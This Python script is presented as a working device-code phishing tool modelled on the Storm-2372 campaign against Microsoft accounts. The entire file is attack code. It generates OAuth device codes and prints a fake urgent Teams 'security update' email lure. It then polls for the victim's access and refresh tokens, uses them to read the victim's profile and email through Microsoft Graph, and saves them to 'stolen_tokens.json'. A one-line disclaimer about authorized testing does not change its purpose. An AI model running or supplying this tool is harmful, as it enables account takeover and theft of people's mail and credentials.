#!/usr/bin/env python3
"""
Working Device Code Phishing Implementation
Based on Storm-2372 campaign and Microsoft threat intelligence research
Using verified working client IDs from 2024/2025
"""

import requests
import json
import time
import uuid
from urllib.parse import quote

# Working client IDs based on research
CLIENT_IDS = {
    "azure_cli": "04b07795-8ddb-461a-bbee-02f9e1bf7b46",  # Azure CLI - works with device code flows
    "azure_powershell": "1950a258-227b-4e31-a9cf-717495945fc2",  # Azure PowerShell - consumer accounts
    "ms_auth_broker": "a3f12b8e-8f23-4a8b-9ca8-4b2d3f6e7c8d",  # Microsoft Authentication Broker (updated per MS research)
}

# Microsoft OAuth endpoints
DEVICE_CODE_ENDPOINT = "https://login.microsoftonline.com/common/oauth2/v2.0/devicecode"
TOKEN_ENDPOINT = "https://login.microsoftonline.com/common/oauth2/v2.0/token"
GRAPH_ENDPOINT = "https://graph.microsoft.com/v1.0"

def generate_device_code(client_id, scope="https://graph.microsoft.com/.default"):
    """Generate device code for phishing"""
    
    print(f"[+] Generating device code with client ID: {client_id}")
    
    data = {
        "client_id": client_id,
        "scope": scope
    }
    
    try:
        response = requests.post(DEVICE_CODE_ENDPOINT, data=data)
        response.raise_for_status()
        
        device_info = response.json()
        
        print("\n" + "="*60)
        print("🎣 DEVICE CODE PHISHING PAYLOAD 🎣")
        print("="*60)
        print(f"Device Code: {device_info['device_code']}")
        print(f"User Code: {device_info['user_code']}")
        print(f"Verification URL: {device_info['verification_uri']}")
        if 'verification_uri_complete' in device_info:
            print(f"Complete URL: {device_info['verification_uri_complete']}")
        print(f"Expires in: {device_info['expires_in']} seconds")
        print(f"Interval: {device_info['interval']} seconds")
        print("="*60)
        
        # Create Teams meeting lure (based on Storm-2372 tactics)
        print("\n🚨 SAMPLE PHISHING LURE:")
        print(f"""
Subject: Urgent: Microsoft Teams Meeting - Security Update Required

Dear Colleague,

You've been invited to an important security briefing regarding recent authentication updates.

Meeting ID: {device_info['user_code']}
Join URL: {device_info.get('verification_uri_complete', device_info['verification_uri'])}

To join the meeting:
1. Click the link above or go to: {device_info['verification_uri']}
2. Enter the meeting code: {device_info['user_code']}
3. Complete the authentication to join

This is a mandatory security update. Please join within the next {device_info['expires_in']//60} minutes.

Best regards,
IT Security Team
        """)
        
        return device_info
        
    except requests.exceptions.RequestException as e:
        print(f"[-] Error generating device code: {e}")
        return None

def poll_for_token(client_id, device_code, interval, expires_in):
    """Poll for access token after user authentication"""
    
    print(f"\n[+] Polling for token every {interval} seconds...")
    print(f"[+] Token expires in {expires_in} seconds")
    
    start_time = time.time()
    
    while time.time() - start_time < expires_in:
        data = {
            "grant_type": "urn:ietf:params:oauth:grant-type:device_code",
            "client_id": client_id,
            "device_code": device_code
        }
        
        try:
            response = requests.post(TOKEN_ENDPOINT, data=data)
            token_data = response.json()
            
            if response.status_code == 200:
                print("\n🎉 SUCCESS! Token obtained!")
                print("="*60)
                print(f"Access Token: {token_data.get('access_token', 'N/A')[:50]}...")
                print(f"Refresh Token: {token_data.get('refresh_token', 'N/A')[:50]}...")
                print(f"Token Type: {token_data.get('token_type', 'N/A')}")
                print(f"Expires In: {token_data.get('expires_in', 'N/A')} seconds")
                print(f"Scope: {token_data.get('scope', 'N/A')}")
                print("="*60)
                
                # Test the token
                test_token(token_data.get('access_token'))
                
                return token_data
                
            elif "authorization_pending" in token_data.get('error', ''):
                print(f"[*] Waiting for user authorization... ({int(time.time() - start_time)}s elapsed)")
                
            elif "authorization_declined" in token_data.get('error', ''):
                print("[-] User declined authorization")
                break
                
            elif "expired_token" in token_data.get('error', ''):
                print("[-] Device code expired")
                break
                
            else:
                print(f"[-] Error: {token_data.get('error', 'Unknown error')}")
                print(f"[-] Description: {token_data.get('error_description', 'No description')}")
                
        except requests.exceptions.RequestException as e:
            print(f"[-] Network error: {e}")
            
        time.sleep(interval)
    
    print("[-] Token polling timed out")
    return None

def test_token(access_token):
    """Test the obtained access token by calling Microsoft Graph"""
    
    if not access_token:
        print("[-] No access token to test")
        return
        
    headers = {
        "Authorization": f"Bearer {access_token}",
        "Content-Type": "application/json"
    }
    
    try:
        # Get user info
        print("\n[+] Testing token with Microsoft Graph...")
        response = requests.get(f"{GRAPH_ENDPOINT}/me", headers=headers)
        
        if response.status_code == 200:
            user_info = response.json()
            print("✅ Token is valid!")
            print(f"   User: {user_info.get('displayName', 'Unknown')}")
            print(f"   Email: {user_info.get('userPrincipalName', 'Unknown')}")
            print(f"   ID: {user_info.get('id', 'Unknown')}")
            
            # Try to get emails
            try:
                mail_response = requests.get(f"{GRAPH_ENDPOINT}/me/messages?$top=5", headers=headers)
                if mail_response.status_code == 200:
                    messages = mail_response.json()
                    print(f"   📧 Can access {len(messages.get('value', []))} recent emails")
                else:
                    print("   ❌ Cannot access emails")
            except:
                print("   ❌ Cannot access emails")
                
        else:
            print("❌ Token test failed")
            print(f"   Status: {response.status_code}")
            print(f"   Response: {response.text[:200]}")
            
    except requests.exceptions.RequestException as e:
        print(f"[-] Error testing token: {e}")

def main():
    """Main function to run device code phishing"""
    
    print("🚨 Device Code Phishing Tool 🚨")
    print("Based on Storm-2372 research and verified client IDs")
    print("For educational and authorized testing purposes only!\n")
    
    # Choose client ID
    print("Available client IDs:")
    for i, (name, client_id) in enumerate(CLIENT_IDS.items(), 1):
        print(f"{i}. {name}: {client_id}")
    
    try:
        choice = input(f"\nSelect client ID (1-{len(CLIENT_IDS)}): ")
        client_id = list(CLIENT_IDS.values())[int(choice) - 1]
    except (ValueError, IndexError):
        print("Invalid choice, using Azure CLI client ID")
        client_id = CLIENT_IDS["azure_cli"]
    
    # Generate device code
    device_info = generate_device_code(client_id)
    
    if not device_info:
        print("[-] Failed to generate device code")
        return
    
    # Ask if user wants to poll for token
    poll = input("\nPoll for token? (y/n): ").lower().startswith('y')
    
    if poll:
        token_data = poll_for_token(
            client_id, 
            device_info['device_code'], 
            device_info['interval'], 
            device_info['expires_in']
        )
        
        if token_data:
            # Save token data
            with open('stolen_tokens.json', 'w') as f:
                json.dump(token_data, f, indent=2)
            print("\n✅ Token data saved to stolen_tokens.json")
    else:
        print("\n[*] Device code generated. Use it in your phishing campaign!")

if __name__ == "__main__":
    main()